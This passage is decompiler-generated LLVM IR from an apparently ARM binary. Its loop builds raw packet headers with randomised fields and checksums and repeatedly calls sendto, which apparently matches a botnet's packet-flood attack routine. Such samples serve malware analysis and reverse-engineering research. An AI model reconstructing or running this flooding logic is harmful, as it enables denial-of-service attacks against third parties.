  store i32 %v5_b820, i32* %r2.global-to-local, align 4
  %v0_b824 = load i32, i32* @fp, align 4
  %v1_b824 = urem i32 %v0_b824, 256
  store i32 %v1_b824, i32* %r0.global-to-local, align 4
  store i32 %v1_b3dc, i32* %ip.global-to-local, align 4
  %v3_b82c = udiv i32 %v0_b824, 256
  store i32 %v3_b82c, i32* %r1.global-to-local, align 4
  store i8 %v1_b818, i8* %v1_b808, align 1
  %v0_b834 = load i32, i32* %r1.global-to-local, align 4
  %v1_b834 = load i32, i32* %r0.global-to-local, align 4
  %v4_b834 = mul i32 %v1_b834, 256
  %v5_b834 = or i32 %v4_b834, %v0_b834
  store i32 %v5_b834, i32* %r1.global-to-local, align 4
  store i32 %v4_b838, i32* %r0.global-to-local, align 4
  %v2_b83c = load i32, i32* @r4, align 4
  %v3_b83c = add i32 %v2_b83c, 1
  %v4_b83c = inttoptr i32 %v3_b83c to i8*
  store i8 %v5_b394, i8* %v4_b83c, align 1
  %v0_b840 = load i32, i32* %r1.global-to-local, align 4
  %v1_b840 = trunc i32 %v0_b840 to i16
  %v2_b840 = load i32, i32* @r4, align 4
  %v3_b840 = add i32 %v2_b840, 4
  %v4_b840 = inttoptr i32 %v3_b840 to i16*
  store i16 %v1_b840, i16* %v4_b840, align 2
  %v0_b844 = load i32, i32* %ip.global-to-local, align 4
  %v2_b844 = icmp eq i32 %v0_b844, 0
  store i1 %v2_b844, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_b848, i32* %r1.global-to-local, align 4
  %v0_b84c = load i32, i32* %r2.global-to-local, align 4
  %v1_b84c = trunc i32 %v0_b84c to i16
  %v2_b84c = load i32, i32* @r4, align 4
  %v3_b84c = add i32 %v2_b84c, 2
  %v4_b84c = inttoptr i32 %v3_b84c to i16*
  store i16 %v1_b84c, i16* %v4_b84c, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_b844, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_b770
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_b770, %bb79
  %v0_b858 = load i32, i32* %r1.global-to-local, align 4
  %v1_b858 = trunc i32 %v0_b858 to i8
  %v2_b858 = load i32, i32* @r4, align 4
  %v3_b858 = add i32 %v2_b858, 8
  %v4_b858 = inttoptr i32 %v3_b858 to i8*
  store i8 %v1_b858, i8* %v4_b858, align 1
  %v0_b85c = load i32, i32* %r3.global-to-local, align 4
  %v1_b85c = trunc i32 %v0_b85c to i8
  %v2_b85c = load i32, i32* @r4, align 4
  %v3_b85c = add i32 %v2_b85c, 9
  %v4_b85c = inttoptr i32 %v3_b85c to i8*
  store i8 %v1_b85c, i8* %v4_b85c, align 1
  %v0_b860 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b860, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_b860 = load i32, i32* %r2.global-to-local, align 4
  %v2_b860 = trunc i32 %v1_b860 to i16
  %v3_b860 = load i32, i32* @r4, align 4
  %v4_b860 = add i32 %v3_b860, 6
  %v5_b860 = inttoptr i32 %v4_b860 to i16*
  store i16 %v2_b860, i16* %v5_b860, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_25d48.57 to i32), i32* %r2.global-to-local, align 4
  %v2_b868 = load i32, i32* @global_var_25d48.57, align 4
  store i32 %v2_b868, i32* %r1.global-to-local, align 4
  %v1_b86c = load i32, i32* @r4, align 4
  %v2_b86c = add i32 %v1_b86c, 12
  %v3_b86c = inttoptr i32 %v2_b86c to i32*
  store i32 %v2_b868, i32* %v3_b86c, align 4
  %v3_b870 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b870, i32* %r3.global-to-local, align 4
  store i32 %v2_b34c, i32* %ip.global-to-local, align 4
  %v4_b878 = mul i32 %v3_b870, 16
  %v5_b878 = add i32 %v4_b878, %v2_b34c
  %v6_b878 = inttoptr i32 %v5_b878 to i32*
  %v7_b878 = load i32, i32* %v6_b878, align 4
  store i32 %v7_b878, i32* %r2.global-to-local, align 4
  store i32 %v5_b878, i32* %r3.global-to-local, align 4
  %v1_b884 = load i32, i32* @r4, align 4
  %v2_b884 = add i32 %v1_b884, 16
  %v3_b884 = inttoptr i32 %v2_b884 to i32*
  store i32 %v7_b878, i32* %v3_b884, align 4
  %v0_b888 = load i32, i32* %r3.global-to-local, align 4
  %v1_b888 = add i32 %v0_b888, 12
  %v2_b888 = inttoptr i32 %v1_b888 to i16*
  %v3_b888 = load i16, i16* %v2_b888, align 2
  %v4_b888 = zext i16 %v3_b888 to i32
  store i32 %v4_b888, i32* %r0.global-to-local, align 4
  %v1_b88c = add i32 %v0_b888, 8
  %v2_b88c = inttoptr i32 %v1_b88c to i32*
  %v3_b88c = load i32, i32* %v2_b88c, align 4
  store i32 %v3_b88c, i32* %r1.global-to-local, align 4
  %v2_b890 = load i32, i32* @r4, align 4
  %v3_b890 = add i32 %v2_b890, 20
  %v4_b890 = inttoptr i32 %v3_b890 to i16*
  store i16 %v3_b888, i16* %v4_b890, align 2
  %v0_b894 = load i32, i32* @r4, align 4
  %v1_b894 = add i32 %v0_b894, 20
  store i32 %v1_b894, i32* @r8, align 4
  %v1_b898 = add i32 %v0_b894, 33
  %v2_b898 = inttoptr i32 %v1_b898 to i8*
  %v3_b898 = load i8, i8* %v2_b898, align 1
  %v4_b898 = zext i8 %v3_b898 to i32
  store i32 %v4_b898, i32* %r2.global-to-local, align 4
  %v0_b89c = load i32, i32* %r1.global-to-local, align 4
  %v2_b89c = add i32 %v0_b894, 24
  %v3_b89c = inttoptr i32 %v2_b89c to i32*
  store i32 %v0_b89c, i32* %v3_b89c, align 4
  %v0_b8a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b8a0 = or i32 %v0_b8a0, 1
  store i32 %v1_b8a0, i32* %r2.global-to-local, align 4
  %v0_b8a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b8a4 = add i32 %v0_b8a4, 4
  %v2_b8a4 = inttoptr i32 %v1_b8a4 to i32*
  %v3_b8a4 = load i32, i32* %v2_b8a4, align 4
  store i32 %v3_b8a4, i32* %r1.global-to-local, align 4
  %v1_b8a8 = add i32 %v0_b8a4, 14
  %v2_b8a8 = inttoptr i32 %v1_b8a8 to i16*
  %v3_b8a8 = load i16, i16* %v2_b8a8, align 2
  %v4_b8a8 = zext i16 %v3_b8a8 to i32
  store i32 %v4_b8a8, i32* %r3.global-to-local, align 4
  %v1_b8ac = trunc i32 %v1_b8a0 to i8
  %v2_b8ac = load i32, i32* @r8, align 4
  %v3_b8ac = add i32 %v2_b8ac, 13
  %v4_b8ac = inttoptr i32 %v3_b8ac to i8*
  store i8 %v1_b8ac, i8* %v4_b8ac, align 1
  %v0_b8b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b8b0 = trunc i32 %v0_b8b0 to i16
  %v2_b8b0 = load i32, i32* @r8, align 4
  %v3_b8b0 = add i32 %v2_b8b0, 2
  %v4_b8b0 = inttoptr i32 %v3_b8b0 to i16*
  store i16 %v1_b8b0, i16* %v4_b8b0, align 2
  %v0_b8b4 = load i32, i32* @r8, align 4
  %v1_b8b4 = add i32 %v0_b8b4, 12
  %v2_b8b4 = inttoptr i32 %v1_b8b4 to i8*
  %v3_b8b4 = load i8, i8* %v2_b8b4, align 1
  %v4_b8b4 = zext i8 %v3_b8b4 to i32
  store i32 %v4_b8b4, i32* %r3.global-to-local, align 4
  %v1_b8b8 = add i32 %v0_b8b4, 13
  %v2_b8b8 = inttoptr i32 %v1_b8b8 to i8*
  %v3_b8b8 = load i8, i8* %v2_b8b8, align 1
  %v4_b8b8 = zext i8 %v3_b8b8 to i32
  %tmp104 = urem i8 %v3_b8b4, 16
  %v1_b8bc = zext i8 %tmp104 to i32
  %v1_b8c0 = or i32 %v1_b8bc, 128
  store i32 %v1_b8c0, i32* %r3.global-to-local, align 4
  %v1_b8c4 = or i32 %v4_b8b8, 16
  store i32 %v1_b8c4, i32* %r2.global-to-local, align 4
  %v0_b8c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_b8c8 = add i32 %v0_b8b4, 8
  %v3_b8c8 = inttoptr i32 %v2_b8c8 to i32*
  store i32 %v0_b8c8, i32* %v3_b8c8, align 4
  %v0_b8cc = load i32, i32* %r3.global-to-local, align 4
  %v1_b8cc = trunc i32 %v0_b8cc to i8
  %v2_b8cc = load i32, i32* @r8, align 4
  %v3_b8cc = add i32 %v2_b8cc, 12
  %v4_b8cc = inttoptr i32 %v3_b8cc to i8*
  store i8 %v1_b8cc, i8* %v4_b8cc, align 1
  %v0_b8d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b8d0 = trunc i32 %v0_b8d0 to i8
  %v2_b8d0 = load i32, i32* @r8, align 4
  %v3_b8d0 = add i32 %v2_b8d0, 13
  %v4_b8d0 = inttoptr i32 %v3_b8d0 to i8*
  store i8 %v1_b8d0, i8* %v4_b8d0, align 1
  %v0_b8d4 = call i32 @rand_next()
  %v1_b8d4 = trunc i32 %v0_b8d4 to i16
  store i32 %v0_b8d4, i32* %r0.global-to-local, align 4
  store i32 %v1_b418, i32* %r1.global-to-local, align 4
  %v0_b8dc = load i32, i32* @r8, align 4
  %v1_b8dc = add i32 %v0_b8dc, 13
  %v2_b8dc = inttoptr i32 %v1_b8dc to i8*
  %v3_b8dc = load i8, i8* %v2_b8dc, align 1
  %v4_b8dc = zext i8 %v3_b8dc to i32
  store i32 %v1_b8e0, i32* %r2.global-to-local, align 4
  %v1_b8e4 = and i32 %v4_b8dc, 223
  %v5_b8e8 = or i32 %v1_b8e4, %v4_b8e8
  store i32 %v5_b8e8, i32* %r3.global-to-local, align 4
  %v1_b8ec = trunc i32 %v5_b8e8 to i8
  store i8 %v1_b8ec, i8* %v2_b8dc, align 1
  store i32 %v1_b438, i32* %ip.global-to-local, align 4
  %v0_b8f4 = load i32, i32* @r8, align 4
  %v1_b8f4 = add i32 %v0_b8f4, 13
  %v2_b8f4 = inttoptr i32 %v1_b8f4 to i8*
  %v3_b8f4 = load i8, i8* %v2_b8f4, align 1
  %v4_b8f4 = zext i8 %v3_b8f4 to i32
  store i32 %v1_b8f8, i32* %r3.global-to-local, align 4
  %v1_b8fc = and i32 %v4_b8f4, 239
  %v5_b900 = or i32 %v1_b8fc, %v4_b900
  store i32 %v5_b900, i32* %r2.global-to-local, align 4
  %v1_b904 = trunc i32 %v5_b900 to i8
  store i8 %v1_b904, i8* %v2_b8f4, align 1
  store i32 %v1_b458, i32* %r1.global-to-local, align 4
  %v0_b90c = load i32, i32* @r8, align 4
  %v1_b90c = add i32 %v0_b90c, 13
  %v2_b90c = inttoptr i32 %v1_b90c to i8*
  %v3_b90c = load i8, i8* %v2_b90c, align 1
  %v4_b90c = zext i8 %v3_b90c to i32
  store i32 %v1_b910, i32* %r2.global-to-local, align 4
  %v1_b914 = and i32 %v4_b90c, 247
  %v5_b918 = or i32 %v1_b914, %v4_b918
  store i32 %v5_b918, i32* %r3.global-to-local, align 4
  %v1_b91c = trunc i32 %v5_b918 to i8
  store i8 %v1_b91c, i8* %v2_b90c, align 1
  store i32 %v1_b478, i32* %ip.global-to-local, align 4
  %v0_b924 = load i32, i32* @r8, align 4
  %v1_b924 = add i32 %v0_b924, 13
  %v2_b924 = inttoptr i32 %v1_b924 to i8*
  %v3_b924 = load i8, i8* %v2_b924, align 1
  %v4_b924 = zext i8 %v3_b924 to i32
  store i32 %v1_b928, i32* %r3.global-to-local, align 4
  %v1_b92c = and i32 %v4_b924, 251
  %v5_b930 = or i32 %v1_b92c, %v4_b930
  store i32 %v5_b930, i32* %r2.global-to-local, align 4
  %v1_b934 = trunc i32 %v5_b930 to i8
  store i8 %v1_b934, i8* %v2_b924, align 1
  store i32 %v1_b498, i32* %r1.global-to-local, align 4
  %v0_b93c = load i32, i32* @r8, align 4
  %v1_b93c = add i32 %v0_b93c, 13
  %v2_b93c = inttoptr i32 %v1_b93c to i8*
  %v3_b93c = load i8, i8* %v2_b93c, align 1
  %v4_b93c = zext i8 %v3_b93c to i32
  store i32 %v1_b940, i32* %r2.global-to-local, align 4
  %v1_b944 = and i32 %v4_b93c, 253
  %v4_b948 = or i32 %v1_b944, %v3_b948
  store i32 %v4_b948, i32* %r3.global-to-local, align 4
  %v1_b94c = trunc i32 %v4_b948 to i8
  store i8 %v1_b94c, i8* %v2_b93c, align 1
  store i32 %v1_b4b8, i32* %ip.global-to-local, align 4
  %v0_b954 = load i32, i32* @r8, align 4
  %v1_b954 = add i32 %v0_b954, 13
  %v2_b954 = inttoptr i32 %v1_b954 to i8*
  %v3_b954 = load i8, i8* %v2_b954, align 1
  %v4_b954 = zext i8 %v3_b954 to i32
  %v1_b95c = and i32 %v4_b954, 254
  store i32 %v1_b95c, i32* %r2.global-to-local, align 4
  %v2_b960 = or i32 %v1_b95c, %v1_b958
  store i32 %v2_b960, i32* %r3.global-to-local, align 4
  %v1_b964 = trunc i32 %v2_b960 to i8
  store i8 %v1_b964, i8* %v2_b954, align 1
  %v3_b968 = load i32, i32* @r8, align 4
  %v4_b968 = add i32 %v3_b968, 14
  %v5_b968 = inttoptr i32 %v4_b968 to i16*
  store i16 %v1_b8d4, i16* %v5_b968, align 2
  store i32 %v6_b4d0, i32* %r1.global-to-local, align 4
  %v0_b970 = load i32, i32* @r4, align 4
  %v1_b970 = add i32 %v0_b970, 40
  store i32 %v1_b970, i32* %r0.global-to-local, align 4
  %v2_b974 = inttoptr i32 %v1_b970 to i16*
  %v3_b974 = call i32 @rand_str(i16* %v2_b974, i32 %v6_b4d0)
  store i32 %v3_b974, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b6c8

dec_label_pc_b97c:                                ; preds = %dec_label_pc_b53c
  store i32 %v6_b4d0, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_b4d0, 40
  br label %dec_label_pc_b98c

dec_label_pc_b98c:                                ; preds = %dec_label_pc_b6dc, %dec_label_pc_b97c
  %storemerge6.pre-phi = phi i32 [ %v1_b7cc, %dec_label_pc_b6dc ], [ %.pre, %dec_label_pc_b97c ]
  %v0_b9a026 = phi i32 [ %v1_b6d0, %dec_label_pc_b6dc ], [ 0, %dec_label_pc_b97c ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_b4d0, 65536
  %storemerge = add i32 %v6_b4d0, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_b98c = add i32 %storemerge4, 1310720
  store i32 %v1_b98c, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_b98c, 256
  %v3_b994 = and i32 %tmp83, 65280
  store i32 %v3_b994, i32* %r3.global-to-local, align 4
  %v4_b998 = udiv i32 %v1_b98c, 16777216
  %v5_b998 = or i32 %v3_b994, %v4_b998
  store i32 %v5_b998, i32* @r8, align 4
  %v2_bac4 = icmp eq i32 %v1_b4f0, 0
  br label %dec_label_pc_b99c

dec_label_pc_b99c:                                ; preds = %dec_label_pc_b99c, %dec_label_pc_baa8, %dec_label_pc_b98c
  %v0_b9a0 = phi i32 [ %v0_b9a026, %dec_label_pc_b98c ], [ 0, %dec_label_pc_baa8 ], [ 0, %dec_label_pc_b99c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b9a0 = icmp eq i32 %v0_b9a0, 0
  store i1 %v2_b9a0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b9a0, label %dec_label_pc_b99c, label %dec_label_pc_b9ac

dec_label_pc_b9ac:                                ; preds = %dec_label_pc_b99c, %dec_label_pc_baa8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b9b0

dec_label_pc_b9b0:                                ; preds = %dec_label_pc_b9d8, %dec_label_pc_b9ac
  %v1_b9b8 = phi i32 [ %v1_ba98, %dec_label_pc_b9d8 ], [ 0, %dec_label_pc_b9ac ]
  store i32 %v2_b35c, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_b9b8 = mul i32 %v1_b9b8, 4
  %v5_b9b8 = add i32 %v4_b9b8, %v2_b35c
  %v6_b9b8 = inttoptr i32 %v5_b9b8 to i32*
  %v7_b9b8 = load i32, i32* %v6_b9b8, align 4
  store i32 %v7_b9b8, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b9c0 = load i32, i32* @fp, align 4
  %v9_b9c0 = icmp eq i32 %v0_b9c0, 65535
  store i1 %v9_b9c0, i1* %cpsr_z.global-to-local, align 1
  %v1_b9c4 = add i32 %v7_b9b8, 20
  store i32 %v1_b9c4, i32* @r5, align 4
  br i1 %v9_b9c0, label %dec_label_pc_babc, label %dec_label_pc_b9cc

dec_label_pc_b9cc:                                ; preds = %dec_label_pc_b9b0
  store i32 %v1_b4f0, i32* %r3.global-to-local, align 4
  store i1 %v2_bac4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bac4, label %dec_label_pc_b9d8, label %dec_label_pc_bad0

dec_label_pc_b9d8:                                ; preds = %dec_label_pc_b9cc, %dec_label_pc_babc, %dec_label_pc_bad0
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_b9dc = load i32, i32* @r4, align 4
  %v3_b9dc = add i32 %v2_b9dc, 10
  %v4_b9dc = inttoptr i32 %v3_b9dc to i16*
  store i16 0, i16* %v4_b9dc, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b9e4 = load i32, i32* @r4, align 4
  store i32 %v0_b9e4, i32* @r0, align 4
  %v2_b9e8 = call i32 @checksum_generic(i32 %v0_b9e4, i32 20)
  %v3_b9e8 = trunc i32 %v2_b9e8 to i16
  store i32 %v2_b9e8, i32* %r0.global-to-local, align 4
  %v3_b9ec = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_b34c, i32* %r2.global-to-local, align 4
  %v3_b9f4 = mul i32 %v3_b9ec, 16
  %v2_b9f8 = add i32 %v3_b9f4, %v2_b34c
  store i32 %v2_b9f8, i32* %r1.global-to-local, align 4
  %v1_b9fc = add i32 %v2_b9f8, 4
  %v2_b9fc = inttoptr i32 %v1_b9fc to i32*
  %v3_b9fc = load i32, i32* %v2_b9fc, align 4
  %v3_ba00 = mul i32 %v3_b9fc, 65536
  store i32 %v3_ba00, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_b9fc, 256
  %v1_ba08 = and i32 %tmp85, and (i32 ptrtoint (i32* @global_var_ff00.32 to i32), i32 16776960)
  %tmp86 = udiv i32 %v3_b9fc, 256
  %v4_ba0c = urem i32 %tmp86, 256
  %v5_ba0c = or i32 %v4_ba0c, %v1_ba08
  store i32 %v5_ba0c, i32* %r3.global-to-local, align 4
  %v1_ba10 = add i32 %v3_b9fc, 1
  store i32 %v1_ba10, i32* %r2.global-to-local, align 4
  store i32 %v1_ba10, i32* %v2_b9fc, align 4
  %v0_ba18 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba18 = load i32, i32* @r5, align 4
  %v2_ba18 = add i32 %v1_ba18, 4
  %v3_ba18 = inttoptr i32 %v2_ba18 to i32*
  store i32 %v0_ba18, i32* %v3_ba18, align 4
  %v0_ba1c = load i32, i32* %r1.global-to-local, align 4
  %v1_ba1c = add i32 %v0_ba1c, 8
  %v2_ba1c = inttoptr i32 %v1_ba1c to i32*
  %v3_ba1c = load i32, i32* %v2_ba1c, align 4
  %tmp87 = mul i32 %v3_ba1c, 256
  %v1_ba28 = and i32 %tmp87, and (i32 ptrtoint (i32* @global_var_ff00.32 to i32), i32 16776960)
  %tmp88 = udiv i32 %v3_ba1c, 256
  %v4_ba2c = urem i32 %tmp88, 256
  %v5_ba2c = or i32 %v4_ba2c, %v1_ba28
  %v1_ba30 = load i32, i32* @r5, align 4
  %v2_ba30 = add i32 %v1_ba30, 8
  %v3_ba30 = inttoptr i32 %v2_ba30 to i32*
  store i32 %v5_ba2c, i32* %v3_ba30, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_ba38 = load i32, i32* @r4, align 4
  %v4_ba38 = add i32 %v3_ba38, 10
  %v5_ba38 = inttoptr i32 %v4_ba38 to i16*
  store i16 %v3_b9e8, i16* %v5_ba38, align 2
  %v0_ba3c = load i32, i32* @r5, align 4
  store i32 %v0_ba3c, i32* @r1, align 4
  %v0_ba40 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba40 = trunc i32 %v0_ba40 to i16
  %v3_ba40 = add i32 %v0_ba3c, 16
  %v4_ba40 = inttoptr i32 %v3_ba40 to i16*
  store i16 %v1_ba40, i16* %v4_ba40, align 2
  %v0_ba44 = load i32, i32* @r8, align 4
  store i32 %v0_ba44, i32* %r2.global-to-local, align 4
  %v0_ba48 = load i32, i32* @sl, align 4
  store i32 %v0_ba48, i32* %r3.global-to-local, align 4
  %v0_ba4c = load i32, i32* @r4, align 4
  store i32 %v0_ba4c, i32* %r0.global-to-local, align 4
  %v4_ba50 = call i32 @checksum_tcpudp(i32 %v0_ba4c, i32 %v0_ba3c, i32 %v0_ba44, i32 %v0_ba48)
  %v5_ba50 = trunc i32 %v4_ba50 to i16
  store i32 %v4_ba50, i32* %r0.global-to-local, align 4
  %v3_ba54 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ba54, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_ba5c = mul i32 %v3_ba54, 32
  store i32 %v3_ba5c, i32* %lr.global-to-local, align 4
  %v3_ba60 = load i32, i32* @r5, align 4
  %v4_ba60 = add i32 %v3_ba60, 16
  %v5_ba60 = inttoptr i32 %v4_ba60 to i16*
  store i16 %v5_ba50, i16* %v5_ba60, align 2
  %v0_ba64 = load i32, i32* %lr.global-to-local, align 4
  %v1_ba64 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_ba64, -8
  %v5_ba64 = add i32 %v0_ba64, %tmp105
  store i32 %v5_ba64, i32* %lr.global-to-local, align 4
  %v0_ba68 = load i32, i32* @r5, align 4
  %v1_ba68 = add i32 %v0_ba68, 2
  %v2_ba68 = inttoptr i32 %v1_ba68 to i16*
  %v3_ba68 = load i16, i16* %v2_ba68, align 2
  %v4_ba68 = zext i16 %v3_ba68 to i32
  store i32 %v4_ba68, i32* @r5, align 4
  %v1_ba6c = load i32, i32* %ip.global-to-local, align 4
  %v2_ba6c = add i32 %v1_ba6c, %v5_ba64
  store i32 %v2_ba6c, i32* @lr, align 4
  %v3_ba70 = add i32 %v2_ba6c, 2
  %v4_ba70 = inttoptr i32 %v3_ba70 to i16*
  store i16 %v3_ba68, i16* %v4_ba70, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_ba7c = load i32, i32* @r4, align 4
  store i32 %v0_ba7c, i32* %r1.global-to-local, align 4
  %v0_ba80 = load i32, i32* @sb, align 4
  store i32 %v0_ba80, i32* %r0.global-to-local, align 4
  %v0_ba84 = load i32, i32* @r7, align 4
  store i32 %v0_ba84, i32* %r2.global-to-local, align 4
  %v0_ba88 = load i32, i32* @lr, align 4
  %v6_ba90 = call i32 @__libc_sendto(i32 %v0_ba80, i32 %v0_ba7c, i32 %v0_ba84, i32 16384, i32 %v0_ba88, i32 16)
  %v3_ba94 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ba94, i32* %r3.global-to-local, align 4
  %v1_ba98 = add i32 %v3_ba94, 1
  store i32 %v1_ba98, i32* %r0.global-to-local, align 4
  %v0_ba9c = load i32, i32* @r6, align 4
  %v9_ba9c = icmp eq i32 %v0_ba9c, %v1_ba98
  store i1 %v9_ba9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ba98, i32* %stack_var_-44, align 4
  %v8_baa4 = icmp sgt i32 %v0_ba9c, %v1_ba98
  br i1 %v8_baa4, label %dec_label_pc_b9b0, label %dec_label_pc_baa8

dec_label_pc_baa8:                                ; preds = %dec_label_pc_b9d8
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_baac = icmp eq i32 %v0_ba9c, 0
  store i1 %v2_baac, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_baac, label %dec_label_pc_b99c, label %dec_label_pc_b9ac

dec_label_pc_babc:                                ; preds = %dec_label_pc_b9b0
  %v0_babc = call i32 @rand_next()
  %v1_babc = trunc i32 %v0_babc to i16
  store i32 %v0_babc, i32* %r0.global-to-local, align 4
  store i32 %v1_b4f0, i32* %r3.global-to-local, align 4
  store i1 %v2_bac4, i1* %cpsr_z.global-to-local, align 1
  %v3_bac8 = load i32, i32* @r4, align 4
  %v4_bac8 = add i32 %v3_bac8, 4
  %v5_bac8 = inttoptr i32 %v4_bac8 to i16*
  store i16 %v1_babc, i16* %v5_bac8, align 2
  br i1 %v2_bac4, label %dec_label_pc_b9d8, label %dec_label_pc_babc.dec_label_pc_bad0_crit_edge

dec_label_pc_babc.dec_label_pc_bad0_crit_edge:    ; preds = %dec_label_pc_babc
  %v0_bad0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bad0

dec_label_pc_bad0:                                ; preds = %dec_label_pc_babc.dec_label_pc_bad0_crit_edge, %dec_label_pc_b9cc
  %v0_bad0 = phi i32 [ %v0_bad0.pre, %dec_label_pc_babc.dec_label_pc_bad0_crit_edge ], [ %v7_b9b8, %dec_label_pc_b9cc ]
  %v1_bad0 = add i32 %v0_bad0, 40
  store i32 %v1_bad0, i32* %r0.global-to-local, align 4
  store i32 %v6_b4d0, i32* %r1.global-to-local, align 4
  %v2_bad8 = inttoptr i32 %v1_bad0 to i16*
  %v3_bad8 = call i32 @rand_str(i16* %v2_bad8, i32 %v6_b4d0)
  store i32 %v3_bad8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b9d8

; uselistorder directives
  uselistorder i32 %v0_babc, { 1, 0 }
  uselistorder i32 %v1_ba98, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_ba64, { 1, 0 }
  uselistorder i32 %v4_ba50, { 1, 0 }
  uselistorder i32 %v3_ba1c, { 1, 0 }
  uselistorder i32 %v3_b9fc, { 3, 2, 0, 1 }
  uselistorder i32 %v2_b9e8, { 1, 0 }
  uselistorder i1 %v2_bac4, { 2, 3, 1, 0 }
  uselistorder i32 %v0_b8d4, { 1, 0 }
  uselistorder i32 %v0_b80c, { 1, 0 }
  uselistorder i32 %v3_b7a8, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v3_b77c, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_b760, { 1, 0 }
  uselistorder i32 %v0_b71c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_b6cc, { 1, 0, 2, 3 }
  uselistorder i32 %v3_b6b8, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_b644, { 1, 0 }
  uselistorder i32 %v6_b63c, { 0, 2, 1, 3 }
  uselistorder i1 %v9_b66c, { 1, 0 }
  uselistorder i32 %v4_b680, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_b5c8, { 1, 0, 2 }
  uselistorder i32 %v0_b778, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_b5b8, { 1, 0 }
  uselistorder i1 %v7_b5b0, { 1, 0, 2 }
  uselistorder i1 %v7_b564, { 1, 0 }
  uselistorder i32 %v3_b560, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_b940, { 1, 0 }
  uselistorder i32 %v1_b928, { 1, 0 }
  uselistorder i32 %v1_b910, { 1, 0 }
  uselistorder i32 %v1_b8f8, { 1, 0 }
  uselistorder i32 %v1_b8e0, { 1, 0 }
  uselistorder i32 %v3_b678, { 1, 0 }
  uselistorder i1 %v2_b694, { 1, 0 }
  uselistorder i32 %v1_b690, { 1, 0 }
  uselistorder i32 %v4_b68c, { 2, 0, 1 }
  uselistorder i32 %v2_b5a0, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_b53c, { 1, 0 }
  uselistorder i1 %v7_b534, { 1, 0 }
  uselistorder i1 %v7_b508, { 1, 0 }
  uselistorder i32 %v3_b504, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_b4f0, { 2, 3, 1, 0 }
  uselistorder i32 %v6_b4d0, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_b4b8, { 1, 0 }
  uselistorder i32 %v1_b498, { 1, 0 }
  uselistorder i32 %v1_b478, { 1, 0 }
  uselistorder i32 %v1_b458, { 1, 0 }
  uselistorder i32 %v1_b438, { 1, 0 }
  uselistorder i32 %v1_b418, { 1, 0 }
  uselistorder i32 %v6_b3f4, { 1, 0 }
  uselistorder i32 %v1_b3dc, { 1, 0 }
  uselistorder i8 %v5_b394, { 1, 0 }
  uselistorder i32 %v6_b374, { 1, 0 }
  uselistorder i32 %v2_b35c, { 0, 3, 1, 2 }
  uselistorder i32 %v2_b34c, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
